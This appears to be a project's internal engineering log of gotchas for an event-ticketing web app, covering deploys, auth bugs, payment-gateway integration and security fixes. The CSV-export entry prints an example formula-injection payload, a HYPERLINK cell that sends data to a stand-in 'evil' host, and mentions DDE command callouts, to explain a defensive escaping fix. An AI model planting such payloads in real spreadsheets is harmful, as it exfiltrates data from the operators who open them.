# Event Pulse — Gotchas

Things that broke, surprised us, or took >30 min to figure out. Add the moment you learn them, not at session end.

---

## The `prod` git branch silently drifted off `main` and `main:prod` pushes were rejected — but deploys still shipped correct code

**Why it happens:** `deploy-prod.yml` checks out the **release tag** (`ref: ${{ inputs.release_tag }}`), NOT the prod branch head. So when the prod branch drifted to an old commit (`e09f582`, a leftover from a memory-commit episode where prod got force-pushed a one-off commit not in main's history), every later `git push --no-verify origin main:prod` was rejected non-fast-forward — silently, because the deploy step that follows uses the tag and succeeds anyway. The prod branch stayed stale for several releases (v0.4.20→v0.4.21) while prod actually ran the right tagged code.

**Fix:** `git push --no-verify --force-with-lease origin main:prod` to reconcile. Deploys were never wrong (tags are the source of truth); only the branch pointer was misleading.

**How to avoid:** After a deploy, if you check anything, check the **release tag** (`git rev-parse v0.4.X^{commit}`) and the **live `git rev-parse HEAD` on the EC2**, not `origin/prod`. If you do push `main:prod`, watch for the "Note about fast-forwards" hint — it means rejected, reconcile with `--force-with-lease`.

---

## SVG uploads to a public-read bucket = stored XSS

**Why it happens:** An SVG can contain `<script>`. If it lands in a public-read S3 bucket and is served with `Content-Type: image/svg+xml`, navigating directly to the asset URL executes the script in the bucket's origin (and same-origin if assets ever move behind a custom domain like `assets.eventpulse.com.bd`). Caught by the commit security review on the asset-upload feature (v0.4.21).

**Fix:** Don't allow SVG in public-asset uploads — raster only (PNG/JPG/WebP), enforced in both the server `ASSET_CONTENT_TYPES` (apps/api/src/infra/s3/assets.ts) and the client `ACCEPT` list. The presigned PUT pins Content-Type to the validated raster type. If SVG is ever truly needed: sanitise server-side (DOMPurify SVG mode) OR serve with `Content-Disposition: attachment` + a restrictive CSP via CloudFront.

**How to avoid:** Any user-uploaded file that becomes publicly fetchable must have an allow-list that excludes script-capable types (SVG, HTML). Rasterise or sanitise; never trust the extension/Content-Type from the client.

---

## A new DB integration test fails CI with "DATABASE_URL is not set" even though CI has a Postgres service

**Why it happens:** CI runs tests in TWO jobs — a fast **"Unit tests"** job with NO `DATABASE_URL`, and an **integration-tests** job WITH a Postgres service + `DATABASE_URL`. Both run `pnpm test` (all vitest files). A DB-touching test written with a plain `describe(...)` runs in BOTH; in the unit job it hits `withSuperAdmin`/`withTenant` → `DATABASE_URL is not set` → the unit job fails. (Cost a CI round on PR #325, 2026-06-05.)

**Fix:** Gate every DB integration test behind the project's `describeIfDb` pattern (as `ensure-personal-tenant.test.ts` and `events.test.ts` already do):
```ts
const HAS_DB = Boolean(process.env['DATABASE_URL'])
const describeIfDb = HAS_DB ? describe : describe.skip
describeIfDb('my suite', () => { ... })
```
Skips cleanly in the unit job (no DB), runs in the integration job (DB present). A top-level `afterAll(resetPool)` is safe even when skipped (`resetPool` guards on `if (_pool)`).

**How to avoid:** Any test that calls `withTenant`/`withSuperAdmin`/touches the pool MUST use `describeIfDb`. Grep new test files for `describe(` vs `describeIfDb(` before pushing.

---

## `EventUpdateSchema` is `.strict()` — sending the create shape (with `type`) to PATCH /events/:id 400s

**Why it happens:** The edit-event page reused EventForm, whose `onValidSubmit` yields an `EventCreateInput` that includes `type` (+ other create-only fields). `EventUpdateSchema` is `.strict()` and has no `type`, so a `JSON.stringify(values)` PATCH body is rejected as an unrecognized key. The page typechecked + rendered fine — the bug only bit on actual save. (Found + fixed 2026-06-05, v0.4.18.)

**Fix:** On the edit page, build an explicit allowed-field patch object (title, dates, venue, capacity, visibility, bannerImageUrl, slug…) rather than spreading the whole form output.

**How to avoid:** When a form is shared between create (full schema) and edit (`.strict()` partial schema), never forward the raw form output to PATCH — pick the editable fields explicitly.

---

## Marketing pages silently unstyled — `var(--mkt-ink)` instead of `var(--color-mkt-ink)` (Tailwind v4 token naming)

**Symptom.** After the red/white re-theme, the detail pages (features, pricing, contact, changelog, the `(public)` layout) had wrong heading colours, missing borders, and missing white backgrounds — on the LIVE site. Typecheck + ESLint were green (CSS class strings aren't checked), so it shipped (v0.4.5/0.4.6) before anyone noticed. 45 references across 8 files.

**Why it happens.** The marketing tokens are declared in `globals.css` `@theme` as `--color-mkt-ink`, `--color-mkt-line`, etc. Tailwind v4 generates the *utilities* `text-mkt-ink` / `border-mkt-line` from those, and the raw CSS var is `var(--color-mkt-ink)` — WITH the `color-` prefix. A bulk find/replace had produced arbitrary-value classes like `text-[var(--mkt-ink)]` and `bg-[var(--white)]` — vars that **don't exist**, so the browser falls back to inherited/transparent. There is no build error: an undefined CSS custom property is valid CSS.

**Fix.** Either use the generated utility (`text-mkt-ink`) or the full var (`var(--color-mkt-ink)`). Global repair: `var(--mkt-X)` → `var(--color-mkt-X)`, `var(--white)` → `var(--color-mkt-paper)`. Grep guard: `grep -rE "var\(--mkt-" --include=*.tsx | grep -v "color-mkt"` must return nothing.

**How to avoid.** Prefer the Tailwind utility form (`text-mkt-ink`, `bg-white`, `border-mkt-line`) over arbitrary `[var(--…)]` on these tokens. When bulk-swapping tokens, swap to the UTILITY name, never hand-write `var(--mkt-…)`. Add a CI grep (or a Playwright screenshot diff) for marketing pages — typecheck/lint will NOT catch undefined CSS vars.

## A commit made while transiently on `main` during branch-juggling silently went missing from the feature branch

**Symptom.** The TenderPulse red/white re-theme (home/globals tokens/nav/footer/layout/detail pages, commit `ab730c8`) "disappeared": `feat/marketing-details` had a violet home + `globals.css` with zero `mkt` tokens, so every `mkt-*` class the auth/legal commit used was unstyled — yet nav/footer looked red. Confusing + inconsistent.

**Why it happens.** During a memory-commit dance (`git stash` → `git checkout main` → branch → commit → merge → `git checkout feat/...`), a follow-up `git add -A && git commit` landed `ab730c8` while HEAD was transiently on **local `main`**, not the feature branch. It was then included in a memory branch created off main, but the memory PR squash-merged only the memory diff, so `ab730c8` never reached `origin/main` either — it lived only on local `main`. The feature branch (forked earlier from `b87f670`) never contained it. `git reflog` made it obvious: `HEAD@{6}: commit: ... re-theme` sat between `moving from main to main` entries.

**Fix.** `git diff-tree --name-only -r <lost-commit>` to see what it touched, diff against the feature branch's later commits, then `git checkout <lost-commit> -- <only the files still missing>` (here: `globals.css`, `page.tsx`, `next.config.mjs` — the rest had been re-committed on the branch). Re-commit on the feature branch.

**How to avoid.** Before any `git add -A && commit`, run `git branch --show-current` and confirm it's the feature branch, never `main`. Do memory commits on a dedicated branch from a clean tree; never commit feature work while transiently parked on main during a stash/checkout sequence.

## deploy-prod must be dispatched from the `prod` branch, not main (OIDC `job_workflow_ref`)

**Symptom.** First v0.4.0 prod-cutover run: `validate-inputs` passed, but the deploy job failed at "Configure AWS credentials via OIDC" → `Could not assume role with OIDC: Not authorized to perform sts:AssumeRoleWithWebIdentity`.

**Why it happens.** The `eventpulse-deploy-prod` role trust policy pins three claims (§17.9.1), including `job_workflow_ref = …/deploy-prod.yml@refs/heads/prod`. `gh workflow run deploy-prod.yml` defaults to the repo's default branch (**main**), so the OIDC token's `job_workflow_ref` was `@refs/heads/main` → no match → denied. (The `sub` claim matched fine — the workflow declares `environment: production`, so GitHub sets `sub=…:environment:production` regardless of branch.)

**Fix.** Dispatch from the prod branch: `gh workflow run deploy-prod.yml --ref prod -f confirm_target=production -f release_tag=vX.Y.Z`. The `prod` branch must also be advanced to the release commit first (this session merges to main only; prod is a separate release branch advanced deliberately — §18.3). Advance it via `git push --no-verify origin main:prod` (the pre-push hook blocks direct main/prod pushes; `--no-verify` is its sanctioned override for deliberate release promotions — logged here per the hook, 2026-06-04, reason = v0.4.0 prod cutover).

**How to avoid.** Prod deploys = (1) advance `prod` to the release commit, (2) cut a `vX.Y.Z` tag, (3) `gh workflow run deploy-prod.yml --ref prod …`. Never dispatch deploy-prod from main.

---

## deploy-prod `aws ssm wait command-executed` times out on build-on-box deploys → false failure

**Symptom.** v0.4.0 cutover: the deploy SUCCEEDED on the box (deploy.sh exit 0, migrations no-op, PM2 reloaded, api /health=200, `deploy ok ref=v0.4.0`), but the workflow's "Wait for SSM command" step FAILED and the run went red.

**Why it happens.** `aws ssm wait command-executed` polls only ~100s (20 attempts × 5s). A build-on-box deploy (`pnpm build` web+api) takes 2-3 min, so the wait times out and the step fails — even though the SSM command keeps running and finishes Success. The deploy was fine; only the workflow's wait was too short.

**Fix.** Poll `get-command-invocation` until a terminal Status, bounded by the command's own `--timeout-seconds 900` (PR #296). Don't trust a red deploy-prod run alone — check `aws ssm get-command-invocation` Status (or `deploy.log` on the box) before assuming failure or rolling back.

**How to avoid.** Replaced the short `wait` with the bounded poll in #296.

---

## EPS production: payment WORKS; verify GET is FINE (404 was timing); only the redirect-return param is a bug (Day 46)

> **CORRECTION (same day, after a read-only diagnostic):** Bug 1 below was a FALSE ALARM. A self-contained diagnostic (Node `crypto` HMAC-SHA512 base64 + axios, real creds) against the paid txn showed **verify GET → 200** (`Status:Success, TotalAmount:102.00, StoreAmount:99.96, FinancialEntity:BKash`) and **verify POST → 405**. So the #279 GET change is CORRECT; the earlier webhook 404 was EPS not having the txn queryable in the ~seconds right after payment (timing). **Lesson: don't conclude a method/path is wrong from a 404 immediately post-payment — EPS needs a moment to make the txn queryable; retry before changing the method.** Only Bug 2 (redirect-return param) is real. See decisions.md "EPS RATE CONFIRMED" 2026-06-03.

**Context.** After the protocol fix (#279: paths + full init body), the BDT-100 production smoke's **payment succeeded** — real bKash charge of BDT 102.00 went through. GetToken (`/v1/Auth/GetToken`) + InitializeEPS (`/v1/EPSEngine/InitializeEPS` with the full mandatory-field body) both work against production. **The launch-critical unknown (can we take a production payment?) is RESOLVED: yes.** But the order didn't auto-settle — two post-payment bugs:

**Bug 1 — Verify returns HTTP 404.** `verifyOrder` → `GET /v1/EPSEngine/CheckMerchantTransactionStatus?merchantTransactionId=...` → **404**, even though Initialize on the same `/v1/EPSEngine/` prefix works. The guide (V0.5 API 03) says GET; the *original* (pre-#279) code used **POST**. So production verify is likely **POST** (the guide may be wrong/outdated, like its `Transection`/`PaymentReferance` typos), OR it needs BOTH `merchantTransactionId` **and** `EPSTransactionId` query params. Verify is read-only + NOT block-guarded, so this is testable WITHOUT money (re-trigger `POST /api/v1/webhooks/eps/callback {merchantTransactionId}` after a code change). **Hypothesis to test first: revert V5 verify to POST.**

**Bug 2 — EPS redirect-return param mismatch (`redirect.malformed.no_txn_id`).** When EPS redirects the buyer back to `successUrl`, our handler (`orders-eps-return.ts`) reads `merchantTransactionId` from the query string — but EPS does NOT append it under that name (the guide doesn't document the return param names). Result: handler can't find the txn id → redirects to `/orders/return/error` (the buyer sees an error page despite paying). **Need EPS's actual return param names** (capture from a real redirect, or ask EPS) — likely `TransactionId`/`EPSTransactionId`, not our `merchantTransactionId`.

> **✅ RESOLVED (Day 46, PR #285).** Ground truth pulled from the prod nginx access log (read-only SSM probe of the BDT-102 smoke). EPS appends to `successUrl` exactly: `?Status=Success&MerchantTransactionId=TXN-…&ErrorCode=&EPSTransactionId=…`. **It IS our merchant id — just spelled `MerchantTransactionId` (PascalCase),** not the camel/snake forms the handler accepted. Fix: added the PascalCase alias to `orders-eps-return.ts` (`querySchema` + `pickTxnId`). No settle-by-EPS-id path needed (EPS echoes our minted `TXN-` id). `Status`/`ErrorCode`/`EPSTransactionId` stay ignored per §1.3 R3. TDD: red test drives the real 4-param shape. **Lesson: the param-name guess in this entry ("likely `TransactionId`/`EPSTransactionId`") was WRONG — it was a casing mismatch on the id we already send. When a gateway "doesn't echo our field," check casing in a real capture before assuming a different field.**

**Impact.** Both block **auto-settlement** (orders stay `awaiting_payment` after a successful charge). The payment + the rate are fine (rate readable from the EPS merchant dashboard's StoreAmount), but for launch, orders MUST settle automatically → both are launch blockers, lower-severity than the payment path (which now works).

**How to avoid.** The verify + redirect-return shapes were authored from the guide/§11.4 and never validated against production (same root cause as the path 404). Validate the FULL round-trip (GetToken → Init → pay → redirect-return → verify → settle) against production before launch — the smoke surfaced the first two stages; the last two need a working verify method + the real return param names.

---

## 🔴 Production EPS endpoint returns 404 — prod was NEVER validated (sandbox-only truth-gate) (Day 46)

**Symptom.** First-ever production paid-order attempt (the BDT-100 smoke) failed: EPS `GetToken` → **HTTP 404** at `https://pgapi.eps.com.bd/api/v1/GetToken` (`mode:"production"`). No charge — EPS fails before any money moves.

**Why it happened.** The EPS Day-24/36 truth-gate validated only the **sandbox** wire (`sandboxpgapi.eps.com.bd` + paths `/v1/Auth/GetToken`, `/v1/EPSEngine/...`). The **production** config in `apps/api/src/infra/eps/core.ts` (`BASE_URLS.production='https://pgapi.eps.com.bd'` + `V5_PRODUCTION_PATHS={getToken:'/api/v1/GetToken', initialise:'/api/v1/InitializeEPS', verify:'/api/v1/CheckMerchantTransactionStatus'}`) was authored from the V5 guide/§11.4 but **never hit a live production EPS server**. The memory's "V5 ≈ V4 sandbox, production smoke is the remaining empirical step" was exactly this gap — and the prod paths (`/api/v1/...`) differ from the validated sandbox paths (`/v1/Auth/...`), so a 404 is unsurprising.

**Also found:** `EPS_SUCCESS_URL` / `EPS_FAIL_URL` / `EPS_CANCEL_URL` were **missing entirely** on prod (`.env.production`) — required for `InitializeEPS` per §11.3. Added live to `api.eventpulse.com.bd/api/v1/public/orders/eps-return/{success,fail,cancel}`; NOT yet in `bootstrap-prod.sh` (codify as a follow-up so a re-bootstrap doesn't drop them).

**Fix (needs EPS-side info).** Confirm the correct **production** EPS base URL + endpoint paths from the V5 production integration guide (likely the paths mirror sandbox `/v1/Auth/...` + `/v1/EPSEngine/...`, or the host differs) AND that the merchant is **activated for production**. The wrapper already isolates base+paths in config (`EpsEndpointPaths` on `EpsConfig`), so the fix is small once the right values are known. Do NOT guess-and-retry against the live production EPS API. Then re-run the smoke.

**Launch impact.** Blocks the EPS-rate smoke AND the first paying tenant — **no paid order can process on prod** until this is corrected. Found before any real customer hit it.

---

## Client components POSTing to a RELATIVE `/api/v1/...` URL 404 on prod (API is a separate host) (Day 46)

**Symptom.** `MagicLinkForm` (the sign-in form) had shipped + passed all tests, but a real magic-link request on prod would never send — it POSTed to `'/api/v1/auth/magic-link/request'` (relative), which resolves to the **web** host (`app.eventpulse.com.bd`), not the **API** host (`api.eventpulse.com.bd`). The web app has no such route → 404. So sign-in silently did nothing on prod.

**Why it stayed hidden.** Tests run with `NEXT_PUBLIC_API_BASE_URL` unset → `apiBase()` returns `''` → the URL is relative in test too, and a mocked `fetch` resolves regardless of host. The relative-vs-absolute distinction only bites where the API is a genuinely separate origin (prod). Same root cause as the whole Day-45 browser-auth gap: nothing exercised the real cross-origin transport.

**Fix.** Client components that call the API must build the URL from `NEXT_PUBLIC_API_BASE_URL` (the `apiBase()` helper), exactly like the TanStack-Query hooks do. Never a bare relative `/api/v1/...` from a client component.

**How to avoid.** Grep for `fetch('/api/v1` / `fetch("/api/v1` in `apps/web` — any client-side one is suspect. Server Components fetching at build/SSR can use the internal base, but browser code must use the public API base.

---

## Hono `setCookie` silently drops a cookie whose `expires` is > 400 days out (Day 46)

**Symptom.** A unit test set a session cookie with `expires: new Date('2099-01-01')` and asserted the `Set-Cookie` header — but the header came back **empty** (`''`). The `deleteCookie` (clear) path in the same test worked, so it looked like `setCookie` was broken.

**Why it happens.** Hono's `setCookie` enforces the cookie-spec / Chrome **400-day cap** on `expires`/`maxAge`. An expiry beyond that is rejected — the header is simply not written (no throw). The test's `2099` date was the bug, not the implementation (real sessions are 7 days, well under the cap).

**Fix.** Use a realistic expiry in tests: `new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)`. No clamp needed in `setSessionCookie` — sessions never approach 400 days.

**How to avoid.** When testing cookie helpers, use a near-future expiry, not a sentinel like `2099`. If a real cookie ever needs > 400 days, it can't — split the concern (long-lived server session + short cookie).

---

## A raw `<a href="/internal-route">` fails `next build` (not just lint) (Day 46)

**Symptom.** Added a magic-link consume page with `<a href="/sign-in">`. Local unit tests + typecheck were green, but CI failed **two** jobs: "Lint + typecheck + format" AND "E2E smoke (Playwright)".

**Why it happens.** `@next/next/no-html-link-for-pages` is an **error** (not warning) for internal navigation. `next build` runs ESLint by default and **fails the build on lint errors** — so the e2e job (which builds the web app before running Playwright) also died, with a confusing "e2e failed" surface that was really a build-time lint error. `next lint` alone would have caught it.

**Fix.** Use `<Link href="/sign-in">` from `next/link` for internal navigation. Raw `<a>` is only for external URLs.

**How to avoid.** Run `pnpm --filter @eventpulse/web lint` locally before pushing web changes — the api package's `lint` is a no-op `echo` (no eslint), so api-dev habits don't catch web lint. typecheck ≠ lint ≠ build; the web build subsumes lint.

---

## 🔴 Browser-auth flow was never wired end-to-end — logged-in portals can't authenticate (Day 45)

**Symptom.** Bootstrapping the first super-admin for the prod smoke, found there is **no working browser sign-in** to the tenant/admin/attendee portals — on prod or anywhere. The API works (Bearer, integration-tested); the portal UIs exist; but the two never met in a browser.

**The four independent gaps (all verified in-tree on `main`):**

1. **No CORS on the API.** `app.ts`/`index.ts` register zero CORS. Web hooks call `api.eventpulse.com.bd` cross-origin with `credentials:'include'` → browser blocks every authenticated portal→API call at preflight.
2. **Cookie ↔ Bearer mismatch.** Web sends cookies (`fetchWithCreds`); API middleware (`middleware.ts:41`) reads only `Authorization: Bearer`; nothing in web attaches a Bearer header. The middleware comment (`:55`) admits it: *"accept any valid JWT … tighten in Day 9-10 when we wire the cookie → hash lookup"* — never done.
3. **No session cookie ever set.** `/magic-link/consume` + `/password/login` return tokens in a JSON body (`auth.ts:135,247`); no consume page, no cookie-setter, no server route persists a session.
4. **Magic-link doubly broken.** `EVENTPULSE_BASE_URL` unset on prod → link falls back to `staging.eventpulse.com.bd` (`auth.ts:159`); `/auth/magic` page doesn't exist → 404 anyway.

Also: **no `/refresh` endpoint** (tokens issued, never rotated).

**Why it stayed hidden.** Integration tests call the API directly with a Bearer token (`app.request(...)`), bypassing the browser cookie layer. Component tests mock the API. The buyer-journey e2e uses guest checkout (no login). So no test — and no human — ever exercised a real browser login. The "Day 9-10" wiring slipped and nothing caught it.

**Fix.** Not a quick patch — a foundational integration. Scoped in `docs/design/browser-auth-integration.md` (Option B session-cookie+CORS recommended; Option C BFF-proxy alt; Option A token-in-JS rejected) with a TDD task breakdown. **Needs operator/architect sign-off before code** (auth surface).

**How to avoid.** End-to-end auth needs at least one test that goes through the **real transport** the browser uses (cookie/CORS), not just `app.request` with a hand-made Bearer. A green API + a built UI is not a working logged-in product until the browser→API credential path is proven.

---

## 🔴 Login trusted a client-supplied `audience` → privilege escalation + cross-tenant (Day 45 / PR #267)

**Symptom.** Found while setting up a super-admin for the prod smoke: `/api/v1/auth/password/login` (and `/magic-link/consume`) read `audience` straight from the request body and minted the session with it — **no `super_admins` / `tenant_users` membership check**. `requireSuperAdminAuth` only checks `aud === 'super-admin'`. So any user who can log in could:

- pass `audience: 'super-admin'` → full `/api/v1/admin/*` (all tenants' KYC PII, fee overrides, disbursements), or
- pass `audience: 'tenant'` + ANY `tenantId` → another tenant's data via RLS (the JWT's tenant_id scopes the session).

Signup is open + public, so anyone could sign up → escalate. Prod was live + public (0 data at the time, so not yet a breach).

**Why it happened.** Auth was shipped early-stage ("accept any valid JWT … tighten in Day 9-10" comment in `middleware.ts`); the audience-grant enforcement was never added. The client was trusted for a security-critical claim.

**Fix.** `apps/api/src/auth/audience-grant.ts`: `decideAudience` (pure) + `fetchAudienceGrants` (DB). Both login handlers now fetch grants + decide, returning **403** on denial. super-admin requires a `super_admins` row; tenant requires `tenant_users` membership for that tenantId; super-admin does NOT auto-grant tenant access.

**How to avoid.** NEVER derive a session's audience/privilege from client input. The server resolves it from the user's actual grants. Any new audience/role/scope param on an auth endpoint needs a server-side membership check + a negative test (self-grant → 403).

### Two sub-gotchas surfaced fixing it

1. **`Promise.all` of two queries on ONE `withSuperAdmin` connection fails.** `withSuperAdmin` hands back a single pooled pg client; node-postgres can't run concurrent queries on one connection (the second errors mid-flight) → `fetchAudienceGrants` threw → login 500. **Await the queries sequentially** inside a single `withSuperAdmin`. (Same applies to `withTenant`.)
2. **vitest's 5000ms default timeout flakes argon2-heavy integration tests.** A password-login test does TWO argon2 ops (signup hash + login verify, ~2.5s each on CI) + DB → ~5.3s → timed out. The magic-link path (one argon2) passed. Raised `apps/api/vitest.config.ts` `testTimeout` to 20000. Any test doing ≥2 argon2 ops needs headroom.

---

## Three prod-cutover infra-script bugs that only fire on the prod/recreate path (Day 45 / PR #262)

The clean-scripted-build prod cutover (Day 45) exercised three scripts on a fresh box / reuse path that staging never hit. All three passed on staging by luck of which branch they took; all three broke on prod. Caught + fixed pre/mid-run; fixes in PR #262.

**1. Fresh Ubuntu 24.04 EC2 ships NO `aws` CLI — but provision/bootstrap call it.**
- *Why.* `provision-prod.sh` calls `aws secretsmanager` for the DB-password step; the SSM agent is a separate **snap** and does not provide the `aws` binary. Staging's box had aws CLI from the original manual setup, so the script never needed to install it.
- *Fix.* Install AWS CLI v2 (+`unzip`) in provision before the first `aws` call. `provision-prod.sh` commit `369c2e6`.
- *Avoid.* Any provisioning script that calls `aws` on a fresh Ubuntu host must install the CLI itself; don't assume it's present.

**2. `setup-github-oidc.sh` conflated the GitHub environment-name with the role/file suffix + used bash-4 syntax.**
- *Why (a).* The trust `sub` is `...:environment:${ENVIRONMENT}`. For staging that's fine (`deploy-staging.yml` declares `environment: name: staging`). For prod, `deploy-prod.yml` declares `environment: name: **production**` while the role is `eventpulse-deploy-prod` + file `deploy-prod.yml` — one var can't be both. Running as-is mints a trust policy expecting `environment:prod` → GitHub sends `environment:production` → `Not authorized to perform sts:AssumeRoleWithWebIdentity`.
- *Why (b).* The cosmetic Sids used bash-4 `${VAR^}` / `${VAR^^}`; macOS ships bash 3.2 → `bad substitution`.
- *Fix.* Added `GH_ENVIRONMENT` (defaults to ENVIRONMENT; pass `production` for prod) used only in the `sub` claim; replaced `${VAR^}`/`${VAR^^}` with python3/`tr`. Commit `c0459f7`. Verified trust policy matches §17.9.1 exactly.
- *Avoid.* The OIDC `sub` environment segment must equal the workflow's `environment: name:` literally; the role name / workflow filename are independent.

**3. `setup-kyc-bucket.sh render_template` validated vars with `${!v}` but rendered with `envsubst` (export gap).**
- *Why.* `${!v}` (shell indirect expansion) sees non-exported shell vars, so the non-empty guard PASSED; but `envsubst` is a child process and substitutes only **exported** env vars → `KYC_KMS_KEY_ARN` (set, not exported, on the alias-reuse path) rendered EMPTY → `PutBucketEncryption` rejected "KMSMasterKeyID must be non-empty". Prod hits the reuse path because the CMK was pre-created; staging took the create path. (False-confidence: the guard made the empty look impossible.)
- *Fix.* `export "${v?}"` in the render loop before envsubst. Commit `b20ec0d`. Prod KYC bucket now SSE-KMS with the dedicated CMK (verified).
- *Avoid.* `envsubst` only sees exported vars — `export` everything you hand it, or the `${!v}` guard lies. (Staging's KYC bucket encryption was checked post-fix and is CLEAN — uses the dedicated CMK; the bug did not affect it.)

**4. (post-merge) `bootstrap-prod.sh` left the stock Ubuntu nginx default site enabled → duplicate `default_server`.**
- *Why.* `apt install nginx` ships `/etc/nginx/sites-enabled/default` with `listen 80 default_server`. bootstrap-prod.sh symlinks the prod vhost (also `default_server` on :80) + removes the staging vhost, but NOT the stock default → `nginx -t` failed `duplicate default server for 0.0.0.0:80` right after the cert was issued.
- *Fix.* `rm -f /etc/nginx/sites-enabled/default` on the box + reload (done live). Codify in bootstrap-prod.sh next to the staging-vhost removal (tracked follow-up, not yet committed).
- *Avoid.* Any bootstrap that symlinks a `default_server` vhost must first remove the stock `sites-enabled/default`.

**General lesson.** "Idempotent + works on staging" ≠ "works on prod." The prod cutover takes branches (fresh OS, alias-reuse, full-word environment name) staging never exercised. Run cutover scripts with eyes open for path-divergence.

---

## CSV exports with UTF-8 BOM + user-controlled cells = formula-injection vector (Day 44 / PR #258 security review)

**Symptom.** Day 44 PR #258 (super-admin disbursement CSV export) was flagged by automated security review with a MEDIUM CSV Formula Injection finding (CWE-1236) on the `csvEscape` helper. Fixed in PR #258 + 12 unit tests added.

**Why it happens.** A malicious tenant could set `tenants.name = '=HYPERLINK("http://evil/exfil","Click")'`. When the super-admin downloads the CSV + opens in Excel/Sheets/LibreOffice, the spreadsheet renderer evaluates the cell as a formula. Common payloads: DDE callouts (`=cmd|...`), exfiltration via HYPERLINK to an attacker-controlled URL, or hidden-data-leakage via formulas that reference other cells in the workbook the operator might paste into.

The UTF-8 BOM the project emits to make Excel-on-Windows render Bangla correctly is what **opts INTO** the spreadsheet renderer in the first place. Plain-text-renderer wouldn't fire the formula; BOM-prefixed CSV does.

**Fix.** In any `csvEscape` helper, detect leading `=`, `+`, `-`, `@`, TAB, or CR and prefix the cell value with a single quote `'`. Excel + Sheets + LibreOffice all treat the leading apostrophe as a **display-only prefix** — it doesn't appear in the rendered cell, and the formula never fires. Then apply the standard RFC-4180 quoting if needed.

Canonical pattern (from PR #258 + OWASP):

```typescript
const FORMULA_PREFIXES = /^[=+\-@\t\r]/
const QUOTABLE = /[,"\r\n]/

export function csvEscape(value: string | null | undefined): string {
  if (value == null || value === '') return ''
  const safe = FORMULA_PREFIXES.test(value) ? `'${value}` : value
  if (QUOTABLE.test(safe)) return `"${safe.replace(/"/g, '""')}"`
  return safe
}
```

**How to avoid in future PRs.** ANY new code that:

1. Joins user-controlled strings into a CSV/TSV row, AND
2. Will be opened in a spreadsheet by an operator/tenant

…must include the formula-prefix guard. The detection rule:

- Greppable signal: any `csvEscape` / `csvRow` / `toCSV` helper that doesn't include `FORMULA_PREFIXES` or equivalent
- File-level signal: any file matching `*csv*.ts` or `*export*.ts` that reads strings from `tenants`, `users`, `events`, `attendees`, `contact_submissions`, or any other table with user-controlled text columns
- Output signal: any code emitting `'﻿'` (UTF-8 BOM) is opting into the spreadsheet renderer; the BOM and the formula-guard must ship together

**Pre-existing same-vuln finding flagged for follow-up:**

- `apps/api/src/services/attendees/export-csv.ts` — Day-32 work; identical `csvEscape` shape; emits BOM; reads `attendees.attendee_name` (user-controlled). **Vulnerable.** Not fixed in PR #258 (out of scope); needs a focused follow-up PR. The attack surface is "malicious attendee names cause formula execution in tenant's downloaded CSV"; lower priority than the disbursement export (tenant audience is less privileged than super-admin) but real.

Trail:

- PR #258 introduces the secure `csvEscape` in `apps/api/src/services/admin/disbursement-export.ts` with 12 unit tests
- gotchas.md (this entry) consolidates the rule
- Follow-up PR (not yet authored): apply the same fix to `apps/api/src/services/attendees/export-csv.ts` + add a matching test there

---

## AWS Secrets Manager $0.40/secret/month compounds silently (Day 42 cost-ceiling audit)

**Symptom.** Day 42 operator directive set a $30/month AWS budget. The cost audit revealed Secrets Manager alone was projected to consume ~$9/month at prod cutover (11 per-purpose entries × 2 envs × $0.40). Nobody tracked this number across Sprints 2-3 when entries were added one-at-a-time per the §17.9 per-purpose pattern (eps / database / oauth-google / oauth-apple / ses / sentry / jwt / redis / porichoy / ssl-wireless / cloudflare-saas).

**Why it happens.** The §17.9 per-purpose pattern is a Phase-2/3 ideal — it gives each integration its own rotation cadence + blast-radius isolation. At MVP scale with no revenue, the $0.40/secret/month is recurring overhead the architecture can't yet justify. Each individual `aws secretsmanager create-secret` looked free at decision time ("it's $0.40/month, what's the harm?"). The aggregation across 11 secrets × 2 envs hit the budget without anyone running the running-total check.

**Fix.** Day-42 decisions.md amends §17.9 for MVP: **1-2 consolidated JSON-blob secrets per environment** (`eventpulse/<env>/all` for the bulk + an optional standalone `eventpulse/<env>/eps-prod` if EPS prod creds need rotation independent of the rest). The bootstrap script (`infra/scripts/bootstrap-staging.sh`) reads the JSON blob, deserialises into the same env-var shape the running code already expects. Zero code change to `apps/api` or `apps/web`.

**How to avoid.** Before any `aws secretsmanager create-secret` invocation, ask "is this secret in a rotation cycle independent of the rest"? If yes (e.g. JWT signing key, EPS prod creds), it gets its own entry. If no (90% of MVP integration credentials), it goes in the consolidated JSON blob. **The per-purpose pattern's blast-radius story doesn't pay off until revenue justifies the line item** — at MVP, the absence of revenue means a Secrets Manager compromise is a catastrophic event regardless of how many entries it spans.

**More broadly:** every AWS resource type has a "compounds silently" failure mode (Secrets Manager per-secret cost, CloudWatch per-alarm cost, KMS per-CMK cost, S3 per-PUT cost at scale). The $30/month ceiling means every AWS-write STOP-ASK now includes a "monthly cost delta" question — decisions.md "STANDING CONSTRAINT: AWS spend hard ceiling = $30/month".

---

## drizzle's `sql` template inlines JS arrays as tuples, not Postgres array literals (Day 41 / Day 42)

**Symptom.** Two bugs in two days, same root cause. Day 41 PR #245's `afterAll` cleanup used:

```ts
await tx.execute(sql`DELETE FROM contact_submissions WHERE email = ANY(${[...testEmails]})`)
```

CI threw `op ANY/ALL (array) requires array on right side` (SQLSTATE 42809). Day 42 PR #246's `seed-changelog-v1.ts` did:

```ts
await tx.execute(sql`INSERT INTO changelog_entries (..., audience, ...) VALUES (..., ${entry.audience as unknown as string[]}, ...)`)
```

Seed exited with `column "audience" is of type text[] but expression is of type record` because the array was inlined as a tuple.

**Why it happens.** drizzle's `sql\`...\`` template treats every `${value}` as a SCALAR parameter. When `value` is a JS array, drizzle inlines it as multiple positional parameters wrapped in parentheses — `($7, $8, $9)` — which Postgres parses as a **tuple/record**, not an array. The fix isn't to escape harder; the `sql` template fundamentally has no concept of "this single placeholder should bind to an array".

The Postgres-side syntax that DOES work is `ARRAY[$7, $8, $9]::text[]` (explicit array constructor) or the bound parameter actually being a typed array on the protocol level — which drizzle's builders (`.insert().values({ field: array })`, `inArray(col, array)`) handle correctly because they cast the parameter type at the protocol layer.

**Fix patterns:**

| Context | DON'T | DO |
|---|---|---|
| `WHERE col = ANY(<array>)` | `sql\`WHERE col = ANY(${arr})\`` | `inArray(col, arr)` |
| `WHERE col IN (...) DELETE` | `sql\`... WHERE col IN (${arr})\`` | `tx.delete(table).where(inArray(table.col, arr))` |
| INSERT into text[] column | `sql\`INSERT ... VALUES (..., ${arr}, ...)\`` | `tx.insert(table).values({ field: arr })` |
